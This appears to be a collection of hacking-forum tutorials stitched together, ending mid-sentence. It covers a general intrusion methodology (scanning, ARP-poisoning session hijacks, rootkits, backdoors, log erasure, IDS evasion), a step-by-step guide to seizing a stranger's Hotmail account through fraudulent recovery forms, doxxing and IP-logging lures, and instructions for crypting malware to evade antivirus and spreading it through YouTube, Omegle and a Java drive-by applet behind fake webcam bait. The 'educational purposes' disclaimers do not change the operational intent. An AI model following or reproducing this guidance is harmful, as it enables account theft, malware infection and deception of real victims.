somebodys else. This is kind of a stealth scan: nmap -v -sS -A -sV xx.xxx.xx.xx > filename This above request gives you very specific details about your target. sV is for version information identification. Check out the manual to know what these flags do - type \""man nmap\"" to see the manual... Alright, after we have fingerprinted services & OS, now its the time to check for various vulns against application(services) & OS running on the target system. This is called vulnerability assessment. To do vulnerability assessment, you can use the tools available, such as nessus. Nessus is free vulnerability assessment, huge database, its the best assessment tool. Lets scan vulns on the target system. Lets say target system is win 2000 SP1 IIS 5.0, nessus goes back to its database and check the vulns for win2000 & IIS 5.0. If there is vulns not discovered, vulnerability assessment tool actually cant catch it. However, if nessus couldnt find matching vulns for the target system, it will let you if the system can have some security issues or not. Such tools are considered as Automated Vulnerability Assessment Tools. You have to know about the target system OS so you can do vuln assessment on it. There are vuln assessment OS specific, e.g. MBSA tool(only scans Win OS). NOTE: you can do vulnerability assessment manually, this depends on you and your skills. By doing it manually, you can discover vuln. that nobody knows about it, and you can use it for your own use. It is a powerful and very discrete. After we determined what systems & what services contain vulnerability, then we can exploit it(means take a chance of this vulnerability to achieve what you want). common vulnerabilities out there are: OS vulnerabilities Webserver vulnerabilities Database vulnerabilities TCP stack vulnerabilities Application vulnerabilities Malwares, viruses, trojans, can be used to exploit vulnerabilities. There are several automated vulnerability scanners, such as Nessus, Nikto. Security websites is a good resource for vulnerabilities as well, e.g. bugtraq, CVE(Common Vulnerabilities and Exposures) sites, etc. Another good source to find vulnerabilities is hacker web sites. Lets talk about the tools: *Nessus - this is a great vulnerability assessment tool. However, in alot of cases it will perform exploits to see if the OS or service is actually vulnerable or not. *Metasploit Framework - this is not vuln assessment tool. It is an exploitation tool, it contains hundrands of exploits helps you to exploit the system by using a nice selection of tools. I will explain shortly about the common vulns... OS Vulns: OS exploits are used to gain access to the system. OS exploits can used for DoS attacks too. watch the video tutorial. Most OS holes exist from default configuration, services and applications. Webserver Vulnerabilities: webservers are the most trageted section. All people contact the webserver, thus you never know the hacker than a normal user. Webservers examples, Apache, IIS, and Tomcat. After you exploit the vulnerability in your target webserver, you can gain many different things, such as root access(the gist), website defacement, DoS(put the server down), theft or alteration data on server, or further penetration into the network. Webserver is a great place to start when you want to do a penetration test! Database Vulnerabilities: those software vendors who create databases applications such as SQL, Oracle, etc - they dont have security in mind, they care more into effeciency and how to make it easy for the users to handle with the database. They care about making their customers happy without giving that much attention in security issues! TCP Stack Vulnerabilities: this is not a common used method to hack systems. Google it! Application Vulnerabilities: some examples of application vulnerability, buffer overflow, weak authentication mechanisms, poor data validation(the most common one), and poor error checking. ALRIGHT, to discover these vulnerabilities on the target machine you need to do vulnerability assessment. This can be done in two ways, manually or automatically. Manually means you try to discover a vuln. by yourself which eventually you will have vuln. that nobody else knows it & you can use it for yourself or publish it to security sites. Automatically means you rely on a tool that searches for vulns in the target machine, this tool has a database full of vulns. so this tool will only inform you the vulns found in the target machine by relying on its database. We are going to talk about auto vulnerability assessment. The most common & wonderful tool is Nessus, its free open source code! Alot of common sense comes into play when analyzing vulns, for example you do not look for a database vulnerability in a webserver, things like that. Another resources, OVAL - gives you a good and basic foundation of vulns assess. methodology, FrSIRT - keeps track of vulns and make exploits of these vulns, you can join a paid subscription and then browse vulns avaialbe in their database and download exploits this is a good source for hacking or security, and websites for posting exploits such as milw0rm, hacking sites. Lets have a closer look at nessus tool, nessus is client/server architecture. The process of setting it up is cumbersome. Nessus have about 9000 plugins, therefore it takes time to peroform the assessment. Results can be reviewed in a report. The report includes the vulnerabilities found on the target machine with a short description about the vulnerability. Note: you can enable several plug-ins in plugin tab. You can specify range of ports through scan options. To specify the target, you should go to the target tab. Once we have done the vulnerability assessment, and knew what vulnerabilities exit. We start gathering exploits of the found vulnerabilities to penetrate the system. Lets talk about penetration and access! After all information we have gathered previously, its the time to break the system with the exploits you have. Its the time to stop gathering information and start breaking into system. The ultimate goal is to gain the highest level of permissions. Try to use undiscovered techniques and methods. Think out of the box! Some of exploits that enable penetration are: *Buffer overflows *Stack exploits *Web vulnerabilities *Services/apps that allow unauthenticated access. Aside from the standard methods of penetration, lets see an penetration methods, here are some examples: *SQL Injection - ability to change queries in the application before its sent into database. *Application Error Handling - this can result DoS. Probably one of the most common vulnerability you can find in corporate arenas. *Directory Traversal - browse directories you should not be able to do so on. *Malformed Packets - one of the more difficult methods of penetration, requires very extensive knowledge of how TCP packets are assembled and disassembled. But once you get used to it, its probably the most effective ways of hacking. *Bypassing Access Controls - password cracking is most common means of accessing systems. *Social Engineering - i guess you know what it means. *Sniffers - take passwords right off the wire, alot of protocls and application such as http & ftp communicate parrwods over the wire in plain text. *Session hijacking - it is similar to sniffers, but you dont gain a password because we take off the entire session, hijack the victims session & act as you are him. Usually when you get passwords, you get it encrypted, or hashed or hidden in some way or another. Password cracking can be done in several ways, examples: *Brute Force Attack - Every password, can and will be broken by brute force attack. It is about the time. Depends on the size of the password. *Dictionary Attack - less effective than brute force, relies on list of words or phrases. *Hybrid Attack - combination of different tools. It is a combination of effectivence of brute force and dictionary attacks & often using other attack mechanisms, such as cryptanalysis attack (one of the hybird attack). You should know that when you do sniffing, you often get usernames & passwords in plain text. However, you can get encrypted passwords from sniffing as well. You will need to use of the cracking techniques discussed above. Sometimes cracking an encrypted passwords can take secs, hours, days, months, or even more!!! There is a great software called \""Cain & Abel\"", it sniffs passwords from the wire, cracks it, etc. Once you install it, go to sniffers tab, then move to the found passwords in cracker tab to see what you have got! There is lots to it. You should know these techniques as a security person cause if you dont know it, a black hat will take care of it. Now, assume we already have hacked the system. We will try to do different things, such as getting the root, etc. Penetration & compromise got some differences in the meaning. Hacking into system does not mean you have compromised(taking the full control - take over) the system. After you penetrate the system, you can grab the session between client and server, e.g. you keep listening on login sessions, so when the remote user login to google, the session be dropped to you, once you get the session, the remote user wont be able to get into his account he/she will see at page goes blank(disconnected), so he/she may think its a problem in a connection, thus he/she tries to login again & everything works fine! BUT you already got his session, you wont have to go through login page when you want to see his/her email inbox, cause its already among the whole session you have taken.  Another way to do this, lets say the attacker has compromised the users system, thus the attacker can let the session drop on his machine, then he takes the session, reads and saves it. After that, he redirects the user to the server, this step will make everything works ok like nothing wrong happen. Lets see an example of the above explained steps, after attacker installs \""Cain & Abel\"" application, he moves to \""attack base system\"" & click the sniffer button at the top & click the yellow button(APR Poisoning Button) besides the sniffer button. This APR Poising button trick the attacked system to talk to the attacker instead of normally who it talks to. For testing purposes, go and add various system addresses(IPs) to the list. Let say one of the user amongst those targeted IPs logon into google, at the authentication process you will notice varies pieces of info comes to you. You are gathering info by getting into the middle of the communication process. Now view the files you have got in the list, you can see among the lines the username & password of the users google account in plain text! So how dangerous this can be to your privacy :-/! So be careful.... Once the hacker gains access to the system. He aims for admin(root) access. He moves up from guest level, to user level, up to root level. Owning the box, means take the system & prevent the admin from controlling the system, as well as preventing other hackers from getting in. So you hackers usually move on from the regular level, to the admin level so they can have full control. A hacker needs privilege escalation to compromise the system well. Some exploits allow buffer/stack overflows to obtain admin access. All it takes is a guest user, then a hacker can perform exploitations locally & there he goes to the root.  At this point, we did everything up to owning the box. Now our goal is to protect our access. Thus, we want to maintain our access to that hacked system, so we can use it later. You can maintain a system by using such tools, backdoor accounts, backdoor software programs, rootkits, etc. These tools help you maintain access. Some hackers own the box close all other accounts except his account, so the security person shut the system down, reformat the system and start over again.  By doing this, hacker account will be gone. Once we ensure we have maintained our access to the system, then we want to expand ourselves to other parts of the network. Remember, if you do not do this on your own network, somebody else will take care of it. If he does, i do not think you will be too happy! Once you got an access, and could maintain it successfully. You want to prevent detection or loss of access. There are several methods to maintain access, such as rootkits, OS exploits, erase tracks, install trojans that make you access backdoor, enable null sessions (webmaster usually go to the registry & disable null sessions to keep that vuln. from being exploited, webmasters usually do it once & do not get back to it. You can go there & enable it - NOTE: by enabling null sessions you can give other hackers a chance to hack too), and many more. There different ways of system compromise, system compromise usually depends on your goal, examples of system compromising are root access(ultimate goal), data access/theft, DoS, and many more. Keep in mind, compromised systems can be detected after a while. Now after a hacker breaks into the system, he tries to portect what he has hacked & erase his tracks. During the attack process try not to be detected so the webmaster dont shut the server off, as well as do not forget to erase your tracks, e.g. you dont want the webmaster to see lots of failed logon in the log files, so you erase tracks to prevent future detection. Typically, get in the network as a shadow or ghost.  There are many method to evade those IDS so they dont cut off your attack stream. Common methods for evading defenses might be by fragmenting packets(some programs do that e.g. fragroute), port redirectors, encoders(change the flow, the look, and feel of various traffics to pass firewall). After you get in and deceive defenses, you want to go to the log files and erase your tracks. Remember: sometimes you get in a user account then you get into a root by changing permissions of the user account, so you have to remember to set this user permissions back to as it was, things like that - you know what i mean, put yourself in a hackers shoe. Dont delete the whole log files, this can make the security person more suspicious. We want to leave everything as it was so nobody can get a feel that an intruder was here. To be safe, you should know where your actions are recorded, delete log files and other evidences that can get you caught, steganography(google it), and evading IDS & firewalls. All actions are recorded in some place on the system or the network. Assume IDS detects you, what do security persons do? Usually when you get detected, they may cut off all the ways for you so you dont get a chance to penetrate, they probably going track you down, or they may decide let you go but watch you the entire time. Where are your actions recorded & what things can let security person knows that you hacked his system? they are recorded in log files for various applications(e.g. IIS & Apache log files), file access times(note: there are tools for hackers that allow you to modify file access time), windows registry entries, hacker tools left behind (be aware of the residual configuration you have left behind - make sure you set all the configurations back to as it was), OS performance stats, IDS, proxy servers(make sure how you send and receive data. If you are going to use proxy server, set up a permanent tunnel through the proxy to the remote host that is compromised), and firewalls(usually very rich with logs). There are various types of IDS, IDS can set anywhere in the network. There are network based IDS, host based IDS, and application based IDS. Deleting evidences of your hack is extremely difficult, it requires you have a very high knowledge of the system you are trying to compromise(all the prior steps we did, such as scanning, foot printing, etc will be handy to compromise the system). It is easy to cover the known log files, such as web logs, firewall, IDS logs, etc. However, it is important to know how the default logs work. Highly skilled hackers, study the target well & take the time in fingerprinting & footprinting everything properly. It may take him up to one week before he hacks the target, but when he penetrates his job is done more smoothly & quietly. Unlike, the other ones who are just using some tools to break the system as fast as possible without studying the target well. It is possible to delete log files! It is simple but usually requires admin access. Some files/logs may be deleted automatically with reboot. Dont delete log files, it brings up suspicion. If you do so, the security person can indicates very clearly that a hacker broke into the system. Most common way of hiding your tracks is by using a rootkit. Rootkit is set of tools used by an attacker after the attacker gets the root-access to system. Rootkits conceals(to keep from being observed) attacker activities on the hacked system. Once rootkit set on the system, its practically impossible to rid of it because rootkit uses technology, called \""hooks\"", that usually most of the time embed itself into various components of OS & effectively the OS going to be a toaster when the rootkit is all set and done. Security person has to rebuild his machine when rootkit is detected after we properly investigate it. Steganography its about hiding a file into another file. Like hiding a malware into a normal software which makes it difficult for firewall or AV to detect the malware. Thats the basic concept of Steganography. There are alot of tools out there allow us to hide files inside another files. You can evade IDS & firewalls by using random slow stealth scanning technique so traffic goes unnoticed, this takes longer to scan but makes detection more difficult. Try to use non-standard techniques, think outside the box.  Remember: not everyone out there is a security expert. To secure your system well, you need to put yourself in a hacker set of mind. By now, you have learned the basic methodology that hackers use to break into the system. Anyhow, lets take a closer look on hacking techniques, such as encryption, sql injection, sniffers, and many more. Encryption: files can be encrypted in a storage. Communication channels can be encrypted as well, communication channel encryption encrypts the entire communication path, so all traffics sent and received are encrypted, e.g. SSL technology encrypts the entire communication path. There are many ways hackers get away of encrypted traffic & get info in not encrypted form. If you are using your own encryption method, you always should test your encryption for crackability before you use it officially.  Sniffers: sniffers is a common tool used by hackers. Sniffers listens on any traffic that goes through the wire of the target system, listens ins and outs traffics. Promiscuous mode is a mode that is listening for any traffic that goes through the wire. Standard promiscuous mode sniffer is a basic technique. There are more advanced techniques other than promiscuous mode. Sniffing enables the attacker to pick up a plain text, and other sensitive data that goes from or to the target. Sniffers record captured traffic, then after you sniff you can go offline & start analyzing that captured traffic. Popular sniffers are ethereal, etherape, ettercap, and network monitor(for Win OS only - not so effective). Wireless Hacking: this is a new technology & starts taking place nowadays. Easy to setup, but not frequently secured since not many people understand the security configuration, so they decide not to set it up or set it up poorly. There are various tools that detect wireless networks, popular war driving software are Netstumbler, Airsnort, Airopeek, Kismet, and many more. What is war driving? google it! SQL Injection: sql injection is a technique that allows an attacker to steal a valuable database information. This attack relies on poor data validation and poor error checking. Buffer Overflows: buffer overflow is common, the cause of buffer overflow is poor coding. Buffer overflows might be noticed while coding. Buffer overflow happens when the programmer does not clearly define boundaries on buffers or variables. We use out of bound data to insert malicious code or execute command on the remote host. Buffer Overflows can cause programs to freeze or lockup, can cause machine to crash, or let you use exploits & leads you to compromise the system. To build buffer overflows, you need a good programming skills, good knowledge of stack and buffer vulns.  You need to have the ability to research, analyze vulns & apply the exploit to achieve what you want. Buffer overflow is a very common & hard to produce an application with no buffer overflows at all. There is nothing programmers can do about it, they just need to write the code with security mind of set. If unexpected buffer overflow appears later by chance, programmers will have to fix it. Programmers should test their code from vulnerabilities as much as they can before they publish the application. Rootkits: it is a common hacker technique. Rootkit is malicious program that replaces components of OS. It does a stealth job. Rootkit requires root permission, so you can install it. Linux rootkits are common & you can find them everywhere, unlike Windows. It is very hard to detect a rootkit because it embeds itself so deeply into the target system. Removing rootkit from a system is very hard too, if the security person tries to remove the rootkit out of the system, he will destroy the system since the rootkit is embedded so deeply into the system(into components of OS). The good solution is to format the whole system & install it again. Spoofing: the word spoofing defined as making yourself appear as somebody else. Examples of spoofing, you can spoof an IP address and make yourself appear to be somewhere else, MAC addresses, and emails(very simple to spoof, you send an email to somebody by changing the headers, and things like that). Spoof usually relies on poor implementation of TCP/IP itself or poor implementation of applications. Tools that are used for spoofing differs from one platform to another. Example of the tools, IP spoofing utilities, MAC address modifiers, etc. Spoofing is more into using your skills rather than using a tool.  Denial of Service (DoS): DoS is very common. The ultimate idea is to prevent legitimate users from using the system. Running DoS is very simple, you dont gain anything from doing DoS. Hackers do it to threat companies, things like that. Many methods/level of DoS attacks exist. Examples of some ways of to DoS, ping of death, Windows size overflow, smurf, teardrop attacks, and many more. There are lots of different ways to do it! Web Hacking: web hacking is the most popular attacks. It is based on hacking individual sites, servers, or components based on the website. First step a hacker takes is, enumerate services(applications) on target machine, and then determine what webserver software(apache, IIS, etc) is running on the target system. After that, the hacker exploits against vulns. found in the target system. It will be easier to hack if the hacker knows the version of the service/software running. A webserver attack leads to deeper penetration on the network(move into the targets internal network). Popular attack methods are xxs(cross-site scripting), IIS DLL vulnerabilities(IIS is very commonly exploited), directory traversal, unicode attack, and many more.  What is Unicode attack?  here is quick rough description about Unicode attack, lets say you want to pass space into a URL. If you put a space in URL, webserver will not take your URL, webserver will consider the url is invalid. Thus, if you want to put spaces among the URL, you should put the number 20 in a place of the space(number 20 represents the space), so when the URL goes to the webserver, the webserver says Ok! thats a valid URL, lets process it and so it does. Unicode attack uses this technique in a non-standard(bad way) way to attack the webserver. Thats a quick explaination about unicode attack. Im already about to finish this tutorial, i will just talk about popular tools in a brief manner. I will start with namp.  Nmap is the most popular hacker tool outhere. Linux command line nmap works better and is supported better. Nmap comes with ping utility, port scanning utility, service enumeration & OS fingerprinting.  SuperScan is a windows based tool developed by foundstone Inc. Its easy to use it & a good tool for Windows. Nessus is used for vulnerability assessment. It is an open source software kit, with commercial version available as well. Nessus uses client/server architecute. Server will be installed on a central location. Nessus comes in GUI & command line interface. Nessus uses database that carries latest current exploits for all types of OS & application. Databases in nessus are called plug-ins, hundrends of vulnerability plug-ins exist and are updated daily to include latest exploits. Nessus requires high level of knowledge to use the tool very effeciently. You can go out to the web and download an exploit and then add it to the database. Nessus can take quite long time to do vulnerability assessment. Finally, the information in this tutorial have been gathered from various types of sources, and then i wrote the tutorial in an organized manner from scratch as well as i added some stuff & clarified many parts.  After you have read this tutorial, i recommend you to search and learn about Windows Null Sessions, it is the most critical flaws associated with Windows OS, and google about DNS zone transfers!  This tutorial is a good guide for you that gives you an insight on how to start & different techniques that hackers use and how they are used. I hope you have enjoyed this tutorial & helped you in someway or another. Im not supporting any illegal activities. This tutorial for people who wants to know how hackers think, what steps they take to break into systems & how they do it, so people can have an insight on how to protect themselves against intruders. ***This tutorial is made for educational purposes only*** """

Using the Emails: where hacker configures his email ID and password while creating the server. Keylogger records the key strokes in a temp file and sends it to the hacker in form of emails. But this has a limit as most free email servers like Gmail or Yahoo or Hotmail has limit of 500 composed and received mails. So most hackers use the second method. 2. FTP server: While creating the keylogger server, hackers configure their FTP server, where they receive the logs of key strokes in the form of text file(usally labeled on the basis of current system time stamp). Hackers keylogger server uploads the files to FTP server after every few minutes interval. If we monitor all data packages we can easily scan for one of these and then well have the hackers email info or FTP info. What can we do with this, you might ask; highly skilled hackers obviously wont allow this as they create a completely seperate email or FTP site which leaves no traces of them, but novice skilled hackers (theres plenty of those) will just use their own email or leaving behind information about them. An example could be that you find the name of the person from the email you backtraced - this aint his primary email, so theres nothing valuable. From there you can look up his name on Google, youll probably find his real email on some site; then simply try to login to it using the password from the fake email (most novice skilled hackers will have the same password). Wireshark is a very famous network scanning hack tool which is used by hackers or network forensic experts to monitor the packet flow of their network cards like Ethernet or WLAN. It records each and every packet coming and going out of your systems Network card. Packets is just a bunch of data. Whenever you feel anything suspicious in your system like your system is compromised or you are infected follow the steps below prior to removing the keylogger or RAT from your system. Steps to reverse engeneering the email or FTP servers password: 1. First of all download and install Wireshark. You can easily get this simply by Googling it.  Note: While Wireshark is getting installed, ensure that it installs the Winpcap with it otherwise it wont work properly. 2. Now go to the \""Capture\""-button in the top menu of the Wireshark and select the interface (means your network card which can be Ethernet or WLAN). 3. It will now start capturing the packets through that Network card. What you have to do is just keep capturing the records for atleast 30 minutes for getting the best results. After x time, stop capturing the packets. 4. Now you need to filter your results, for this go to the filter box and type FTP and SMTP one by one. Note: if you get records for FTP then hacker has used FTP server and if you didnt get FTP that means the hacker has used SMTP, so give SMTP in Filter box. 5. As you scroll down you will find the “FTP username” and “Password” for victims ftp account in case FTP server is used. And if hacker has used SMTP then you will find \""email address\"" and its \""password\"" that hacker has used to create the server. """
0	How to hack almost any hotmail, , in 24 hours.	"""   Another GReat TUT I FOUND  This method is called Reverting, and you will be sending a form in to microsoft customer support to reset the password for your (or somebody elses) hotmail account. NOTE: If you are interested in protecting yourself against this hacking method, please refer to this thread. For this method, it helps to know the person, even a little, but ill still give you a step-by-step tut on how to find the information and fill out each part of the form. NOTE: THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY, I AM NOT RESPONSIBLE IN ANY WAY FOR HOW THIS INFORMATION IS USED, YOU USE IT AT YOUR OWN RISK. YOU MAY LEARN ALSO HOW TO GET YOUR OWN ACCOUNT BACK FROM THIS. Step 1: go here: Hidden Content:  You must reply to see links Step 2: Give them your victims full name. Now, if you do not know their first name, try the following things to find it. First, try using these two sites, simply enter their email and hit return. Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links if you want more, google their hotmail account(s), for example, type into google: \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" Spoiler (Click to View) Include the quotes, cause this searches for only the hotmail account. If you gain any results, it will most likely be forums or if youre lucky, social networking sites, that they have filled out their info on. Go through these searches, and look at every one, even make a .txt file in notepad pasting down all the info you can on them. Once youre done, if you havnt got their last name, keep reading..if you have, goto step 3. Presuming you dont yet have their last name, try going to social networking sites, like: Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links Or any others you can think of, and search for their hotmail account using the websites search feature. if you get any results, youre in luck, most of the time people include alot of information on themselves in there. Follow any leads you can find on the info, and even ask them or their friends (look up a tutorial on social engineering info out of people first, it will help). Now another thing you can do is use  Hidden Content:  You must reply to see links  IF your victim has their own website. If you dont have it by now, maybe you should find an easier target, or if youre desperate, use this technique to hack one of their rl best friends, and alot of the time they have their full name assigned to your victims hotmail address, in their addressbook. Or, I sometimes just say \""Im pretty sure I only put in my first name at registration, Im paranoid like that\"" or something along those lines... Its worked for me. BTW: This is called d0xing, or \""documenting\"", basically harvesting info on people, its completely legal as long as you get all your info from the public domain (forums, social networking sites etc). Step 3: The e-mail address for us to send a response: Simple, give them your email address... could use a fake one if youre paranoid (one you got access too), but I dont see any risk. Step 4: Primary e-mail address/member ID associated with the account you are inquiring about: Here you put in your victims email address (the one youre trying to hack). Then click Continue. Step 5: Date of birth. You can simply give them the year, if you dont know any further then that..but if you want to be on the safe side, read step 2, and use those techniques to find their date of birth. Step 6: Country If you dont know their country, which you probably should, use their IP address which you will have in one of the next steps to find it, by using Hidden Content:  You must reply to see links Step 7: State same deal, use their IP addy if you dont know it already Step 8: ZIP or postal code Same deal again, its usually correct if you use the IP addy...just use  Hidden Content:  You must reply to see links and find their town/suburb or whatever, and google the ZIP code for it. Step 9: The secret answer to your question simply put \""i dont remember\"" Step 10: Your alternate email address for this, you just put in the email address youre trying to hack, you dont need their alternate email address. Step 11: Your IP Address Okay so heres probably the toughest one, but its still easy. (NOTE: Its very hard to revert an account unless you successfully complete this step) Theres alot of ways to get their IP, ill give you the easy ones. Email: Get them to send you an email somehow, it doesnt matter how, you can just send an email saying: \""hey, how are you?\"" and theyll probably reply. Once you have their email (dont use old emails, please, everybody uses dynamic IPs these days) right click on it, and click \""view source\"", you will see something like this: Spoiler (Click to View) ...now you want to find \""X-Originating-IP: [XX.XXX.XX.XX]\"" That is their IP address. If the email source is all jibberish and looks encrypted, try what one user suggested: (09-24-2010 07:59 AM)TOMMIE Wrote: ► This is from Hotmail? Right? I get this too.. I forwarded these emails to my broadband providers base email (NOT Webmail), then selected each one and `Save as`, it will prompt you to save in .eml format - save to desktop, then right-click and open in Notepad. You will see detail then. hth Website: Go here  Hidden Content:  You must reply to see links  and register an account for free, its real easy. Now once youre registered, go to Software/Tools > IP Stealer; and then you can type in the URL you want your IP stealer to redirect to.. so just google or myspace or something will do. Now youll see above that they give you your URL, you just send them there and itll grab their IP, redirect them to google (or whatever site you choose), and then show their IP down at the bottom of the page. I suggest using tinyurl or  Hidden Content:  You must reply to see links  to shorten your URL and make it custom, you could make it something like: Hidden Content:  You must reply to see links And viola itll look like a social networking site \""Hey, Im katie. :) Im looking to meet new people and was wondering if you wanted to be friends? ^_^ This is my profile btw: <give fake link>\"" Something like thaat. :P MSN: if you can talk to them on msn, then you can get their IP that way too..theres two ways, either download a easy-to-use script, or do it manually with cmd, ill show you how to do it manually first. Manually: Send them a file, or get them to send you a file. \""hey, i love that song, can you send me it?\"" or \""omg, this is the funniest picture ever\"". Before you start the transfer though, goto start > run (if youre using vista, just press the windows key) and type in cmd, and hit enter. type in the following: netstat -n and hit enter, it will show you a list of active connections to different IPs. Remember or take a screenshot of those IPs, because once you start the transfer, type in netstat again while its transferring and check for any new IPs, that is your victims IP. With a script: IF you have windows live messenger plus (probably the best WLM IMO), download this script: Hidden Content:  You must reply to see links Its called IP-Get, and will show you your current msn contacts IP addresses IF youre currently connected to them with a fileshare. It will also allow you to save the IP addresses, and look up their locations. Here is a screenie of IP-get: Spoiler (Click to View) There are other ways, but surely, you should have been able to get their IP by now...if not, look up a tut on it, using the search feature. Step 12: Your internet service provider very easy to find, use their IP, either using the IP get script if you have it, or  Hidden Content:  You must reply to see links Step 13: The last date and time that you successfully signed in Unless you know this as a fact, either take your best guess, say you dont remember, or yesterday. Step 14: The names of any folders that you created in addition to the default folders leave this blank, or say you dont know (unless you know this for a fact). Step 15: Names of contacts in your hotmail address book give them all the contacts you know are definately or most likely in there, including yourself, and even their other accounts (they might add themselves, everybody seems to). Also give them  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */  and  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ , as most people have them added. Step 16: Subjects of any old mail that is in your inbox okay just use common sense for this one, things to include are: hey, how are you, RE:, FW:, admin, windows live, hotmail staff, recovery, registration, support, lol, password, comfirmation, noreply, delivery status notification (failure). Also, if they are subscribed to any forums (like hackforums(but please dont hack other HF members :P)), social networking sites (like myspace, bebo) or online games (like RuneScape, WoW), then be sure to include them too. Step 17: Names of contacts on your messenger contact list If you happen to know any of their friends, this is where you put their display name...if you dont have them added, put their first names, and if you dont know them at all, just leave it blank, or say you dont remember. Step 18: Your Messenger nickname If you know it, put it in..if you dont, say \""i cant remember it exactly\"" or leave it blank. Step 19: The rest you dont really need to worry about, except for in additional info, can put anything else that might make you sound more convincing..like: \""please do your best to recover my account, i dont want to go and have to add all my friends again, itd be a great help if you got it back for me, thank you in advance.\"" obviously dont put exactly that, but you get the gist of it :) Okay, i believe that is it, within 24 hours you will recieve an email from customer support, they will either give you a link to reset your (victims) password, or ask for you to send it again with more info, as an email reply..and in that case, you dont have much luck, cause they can just get your IP address from the email and know youre lying :) so try again, and hope you get a more gullible staff member.

0	[ULTIMATE] How to SPREAD your viruses successfully [TUTORIAL]	"""   Educational Purposes NOT MINE  In this tutorial I will show you how to spread your trojans/viruses etc. I will show you many methods, and later you choose which one you are going to use. What Is Spreading? Spreading is the way of your trojans/programs/viruses circulates around the Internet. The point of spreading is to put something hard to find, which people like it. Its about what all people want, but dont have it yet. Well the goal of spreading is to get more victims to your RATs/Keyloggers whatever. Getting Started Well, to spread you will need a program to bind your virus with. If you want to get more victims, try to find a small program, advoid large programs. If you dont have any ideas search around the Internet, you will find a lot of fake programs, such as KeyGenerators, Gold Hackers etc. Other way is to make your own programs, its easy all you need is a little programming knowledge or you can find good source around here. Ok, now the main part if you want your spread to be successfully is to make your viruses FUD by AVs. To make your viruses use a binder or crypter. Most of public binders and crypters, are detected even if they are FUD will be detected soon, so the best way is to use a private stub, and it will stay longer FUD. There are many Crypters and Binders you can use, just go the Sellers Section, or search around the Internet! Make sure to test your virus after crypting or binding, because some binders and crypters corrupt the files. Hint for begginers [If you already know this, skip this part]: A Crypter is a programs that makes other programs UD or FUD by encrypting them. A Binder is a program that makes other programs UD or FUD by binding them with another file. UD means undetected, so only a few antivirus programs detect it. FUD means fully undetected, so no antivirus detect it. How and where to spread Well guys, this is the part who all were waiting for. I will show you a few methods how to spread you viruses and trojans. 1. Omegle Omegle is a brand-new service for meeting new friends. When you use Omegle, we pick another user at random and let you have a one-on-one chat with each other. Chats are completely anonymous, although there is nothing to stop you from revealing personal details if you would like. You can use Omegle auto spreader while you sleep or when you are free. You can find Omegle Spreader HERE or you can make your own. If you are going to make your own, THIS may help. 2. YouTube YouTube is a video sharing website on which users can upload and share videos. Make a short video, no longer than 30 seconds or a minute. In the description, make a short tutorial on how to use the program or the keygen you binded your virus with, add the features of the program and put a download link of your virus. Take a picture as proof aswell, that will make people trust your virus more. Make sure you use a good file hosting, because for example rapidshare wont let them download it first time, so people will get bored and wont download. I use multiupload, awesome host and allows you to see the downloads aswell. 3. Java drive by applet Well, this is a nice method of spreading you virus. First of all, for this method you will need a http://file ave.com account. Next step is download the Java files.  Hidden Content:  You must reply to see links  Ok, now login to your FileAve account upload your keylogger/RAT or whatever and copy the direct link for your virus. Then go to the folder with Javas and open \""index2.html\"" right click> Open with.. .> notepad. Now where it says \""http://clerisy.fileave.com//blabla.exe\"" replace it with your virus direct link. You should replace your virus TWICE. And then save it. Now goto [Image: 2d6mtck.jpg] and signup. After you login upload all the files from the javas folder. And youre done setuping the Java Applet. (Thanks to Adam xD for the javas also) Next step is to visit the website we are going to spread. The website is  Hidden Content:  You must reply to see links , there are a lot of horny men who will do anything to see a female on cam. Register an account there call it \""hornyteen\"" or something similar (Use real e-mail, they will send you the password via e-mail). After you register, its time to turn into a girl! We will be using manycam to fool our victims into beliving we are females who are on cam. Download \""ManyCam\"" from  Hidden Content:  You must reply to see links  and install it. Once ManyCam is installed open it. Now open ManyCam and select \""Effects\"" in the left hand corner. Once selected click \""Text over video\"" on the left hand side. One selected you will see an option named \""Show ManyCam.com logo\"" UNTICK this option so that the ManyCam icon disapears. Next, select \""Source\"" Once source is selected on the left hand side select \""Movies\"" then as you can see you can browse movies saved on your computer and play them on your webcam! You could always find videos on YouTube and downloaded them using YouTube downloaders or download some home made porn videos from porn websites. Alright after you have got your video prepared, account registerd. Log into  Hidden Content:  You must reply to see links  with the username and password you registerd with. At the top of the website you should see a button named \""broadcast\"" Click it, then select your options and broadcast to all the horny men, during you being on cam press the STOP button on the movie in ManyCam so that the screen goes black. Once you have done this say in your chatroom something like \""OMG my cam has stoped workin here but its working at \""www.yourwebsite.tk\"" anyone help me? And they think, oh awsome I will go there and get to see her strip but when they visit your site a java popup pop 